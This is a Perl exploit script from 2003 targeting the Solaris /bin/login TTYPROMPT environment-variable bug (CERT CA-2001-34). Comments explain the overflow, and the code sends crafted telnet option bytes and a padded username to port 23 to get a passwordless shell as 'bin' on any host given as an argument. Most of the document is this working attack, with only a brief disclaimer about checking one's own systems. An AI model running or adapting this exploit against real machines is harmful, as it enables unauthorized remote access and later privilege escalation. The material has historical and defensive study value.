#!/usr/bin/perl
#
#  Date: 09/01/2003
#  Author: snooq [http://www.angelfire.com/linux/snooq/]
#
#  I coded this script to demo how to login to a Solaris box without
#  password as 'bin'. Nothing new, it's an old bug which dates back 
#  to Dec 2001.
# 
#  And, there are already several versions of exploits circulating 
#  in the wild for at least a year now. 
#  
#  Due to uninformed/incompetent/ignorant sysadmins, there are still 
#  quite a number of vulnerable machines out there.
#  
#  'root' remote login is not allowed by defaut. So, unless, it's
#  a misconfigured box, you can only go as high as 'bin'. However,
#  once you are dropped into a shell, further priviledge escalation is
#  very possible.
#
#  Background info
#  ===============
#  From http://www.mail-archive.com/bugtraq@securityfocus.com/msg09281.html
#
#  [quote]
#  The problem is there exists an authentication flag called the "fflag" 
#  just after the array that gets overflowed in the .bss segment. This is
#  an array of char pointers so when it is overflowed because of an
#  mismanagement on the indexing of this array the fflag gets overwritten
#  with an valid address on .bss segment. this is good enough to satify 
#  the if(fflag) condition and spawn a shell.
#  [/quote]
#
#  For more info about this bug, go to:
#  http://www.cert.org/advisories/CA-2001-34.html
#
#  Disclaimer
#  ==========
#  This is meant for you to do a quick check own your systems only.
#  The author shall not be held responsible for any illegal use 
#  of this code. 
#
#  -> some asked 'why code another one?' 
#  I'm bored.. I guess.... been using other ppl's tools... it's time 
#  to write my own.. so that I have a reason to feel proud too... 
#  
#  -> again, some asked 'why not in C?'
#  ok... I'm lame.. my C sucks... my Perl sucks too...
#  I'm not a professional programmer anyway... =p
#
#  As usual, any comments or flames, go to jinyean at hotmail.com
#
use Socket;
use FileHandle;

if ($ARGV[0] eq '') {
	print "Usage: $0 <host>\n";
	exit;
}

$payload="\xff\xfc\x18"		# Won't terminal type
	."\xff\xfc\x1f"		# Won't negotiate window size
	."\xff\xfc\x21"		# Won't remote flow control
	."\xff\xfc\x23"		# Won't	X display location
	."\xff\xfb\x22"		# Will linemode	
	."\xff\xfc\x24"		# Won't environment option
	."\xff\xfb\x27"		# Will new environment option	
	."\xff\xfb\x00"		# Will binary transmission
	."\xff\xfa\x27\x00"	# My new environ option
	."\x00\x54\x54\x59\x50\x52\x4f\x4d\x50\x54"	# 'TTYPROMPT'
	."\x01\x61\x62\x63\x64\x65\x66"			# 'abcdef', any 6 chars will do
	."\xff\xf0";		# Suboption end
$port=23;
$user="bin";			# You may change this to another user
$addr=getaddr($ARGV[0]);

for ($i;$i<65;$i++) {
	$user.=" c";		# Again, any char will do
}

socket(SOCKET,PF_INET,SOCK_STREAM,(getprotobyname('tcp'))[2]);
connect(SOCKET,pack('Sna4x8',AF_INET,$port,$addr,2)) || die "Can't connect: $!\n";

print "/bin/login array mismanagment exploit by snooq (jinyean\@hotmail.com)\n";
print "Connected. Wait for a shell....\n";

SOCKET->autoflush();

$pid=fork;

if ($pid) {			# Parent reads	
	send(SOCKET, $payload, 0);
	send(SOCKET, "$user\n", 0);
	read(SOCKET,$buff,69);	# Read the garbage
	while (<SOCKET>) {;
       		print STDOUT $_;
    	}
}
else {				# Child sends
	print SOCKET while (<STDIN>);
	close SOCKET;
}
exit;

sub getaddr {

	my $host=($_[0]);
	my $n=$host;
	$n=~tr/\.//d;

	if ($n=~m/\d+/) {
		return pack('C4',split('\.',$host));
	}
	else {
		return (gethostbyname($host))[4];
	}
}
